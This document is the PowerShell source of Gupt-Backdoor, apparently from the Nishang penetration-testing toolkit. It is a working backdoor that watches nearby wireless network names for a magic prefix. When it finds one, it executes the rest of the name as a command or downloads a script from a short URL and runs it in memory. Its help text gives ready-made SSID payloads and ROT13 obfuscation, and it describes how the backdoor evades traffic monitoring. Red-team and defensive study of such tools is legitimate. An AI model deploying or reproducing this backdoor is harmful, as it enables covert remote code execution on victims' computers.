

function Gupt-Backdoor
{
<#
.SYNOPSIS
Gupt is a backdoor in Nishang which could execute commands and scripts from specially crafted Wireless Network Names.

.DESCRIPTION
Gupt looks for a specially crafted Wireless Network Name/SSID from list of all avaliable networks. It matches first four characters of
each SSID with the parameter MagicString. On a match, if the 5th character is a 'c', rest of the SSID name is considered to be a command and
exeucted. If the 5th character is a 'u', rest of the SSID is considered the id part of Google URL Shortener and a script is downloaded and
executed in memory from the URL. See examples for usage. 

Gupt does not connect to any Wireless network and this makes it more stealthy and helps in bypassing network traffic monitoring. 

.PARAMETER MagicString
The string which Gupt would compare with the available SSIDs. 

.PARAMETER Arguments
Arguments to pass to a downloaded script.

.PARAMETER EncodedCmd
Use this switch if the command part of the SSID name is ROT13 encoded.

.EXAMPLE
PS > Gupt-Backdoor -MagicString op3n -Verbose
In above, Gupt will look for an SSID starting with "op3n". To execute whoami on the target, the wireless network name should be "op3ncwhoami".

PS > Gupt-Backdoor -MagicString op3n -Verbose
In above, Gupt will look for an SSID starting with "op3n". To execute a PowerShell script on the target, the wireless network name should be
"op3nunJEuug". Here, Gupt will use of characters after the 5th one and make the URL http://goo.gl/nJEuug. A script hosted at the URL resolved
by the Google shortener would be downloaded and executed. 

.EXAMPLE
PS > Gupt-Backdoor -MagicString op3n -Verbose
In above, Gupt will look for an SSID starting with "op3n". For PowerShell v3 and onwards, to execute a script on the target, just set the SSID
name to "op3nciex(iwr_bit.ly/2g6JbQB)" and the script will be downloaded and executed in memory on the target. 

.EXAMPLE
PS > Gupt-Backdoor -MagicString op3n -Verbose -EncodedCmd
In above, Gupt will look for an SSID starting with "op3n"and rest of the command encoded with ROT13.
ConverTo-ROT13 from Nishang can be used for encoding a command. 
For PowerShell v3 and onwards, to execute a script on the target, just set the SSID
name to "op3ncvrk(vje_ovg.yl/2t6WoDO)" and the script will be downloaded and executed in memory on the target. 

.LINK
http://www.labofapenetrationtester.com/2014/08/Introducing-Gupt.html
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param(
        
        [Parameter(Position=0, Mandatory = $True)]
        [String]
        $MagicString,

        [Parameter(Position=1, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position=2, Mandatory = $False)]
        [Switch]
        $EncodedCmd
 
    )

    #ROT13 code From learningpcs.blogspot.com/2012/06/powershell-v2-function-convertfrom.html
    function ConvertTo-ROT13
    {
    param(
          [Parameter(Mandatory = $False)]
          [String]
          $rot13string
     )
        [String] $string = $null;
        $rot13string.ToCharArray() | ForEach-Object {
            if((([int] $_ -ge 97) -and ([int] $_ -le 109)) -or (([int] $_ -ge 65) -and ([int] $_ -le 77)))
            {
                $string += [char] ([int] $_ + 13);
            }
            elseif((([int] $_ -ge 110) -and ([int] $_ -le 122)) -or (([int] $_ -ge 78) -and ([int] $_ -le 90)))
            {
                $string += [char] ([int] $_ - 13);
            }
            else
            {
                $string += $_
            }
        }
        $string
    }

    #Get list of available Wlan networks
    while($True)
    {
        Write-Verbose "Checking wireless networks for instructions."
        $networks = Invoke-Expression "netsh wlan show network"
        $ssid = $networks | Select-String "SSID"
        $NetworkNames = $ssid -replace ".*:" -replace " "
        ForEach ($network in $NetworkNames)
        {
            #Check if the first four characters of our SSID matches the given MagicString
            if ($network.ToString().Length -gt 4 -and $network.Substring(0,4) -match $MagicString.Substring(0,3))
            {
                Write-Verbose "Found a network with instructions!"
                #If the netowrk SSID contains fifth chracter "u", it means rest of the SSID is a URL
                if ($network.Substring(4)[0] -eq "u")
                {
                    $PayloadURL = "http://goo.gl/" + $network.Substring(5)
                    Write-Verbose "Downloading the attack script at $PayloadURL and executing it in memory."
                    $webclient = New-Object System.Net.WebClient
                    Invoke-Expression $webclient.DownloadString($PayloadURL)
                    if ($Arguments)
                    {
                        Invoke-Expression $Arguments                   
                    }
                    Start-Sleep -Seconds 10
                }
                elseif ($network.Substring(4)[0] -eq "c")
                {
                    if ($EncodedCmd -eq $True)
                    {
                        $cmd =  ConvertTo-ROT13 -rot13string $network.Substring(5)
                    }
                    else
                    {
                        $cmd =  $network.Substring(5)
                    }
                    if ($cmd -eq "exit")
                    {
                        break
                    }
                    if ($PSVersionTable.PSVersion.Major -ge 3)
                    {
                        Write-Verbose "PowerShell v3 or above in use. Downloading the attack script at $PayloadURL and executing it in memory."
                        Invoke-Expression ($cmd -replace '_',' ')
                        Start-Sleep -Seconds 10
                    }
                    else
                    {
                        Write-Verbose "Command `"$cmd`" found. Executing it."
                        Invoke-Expression $cmd
                        Start-Sleep -Seconds 10
                    }
                }
            }
        }
        Start-Sleep -Seconds 5
    }
}

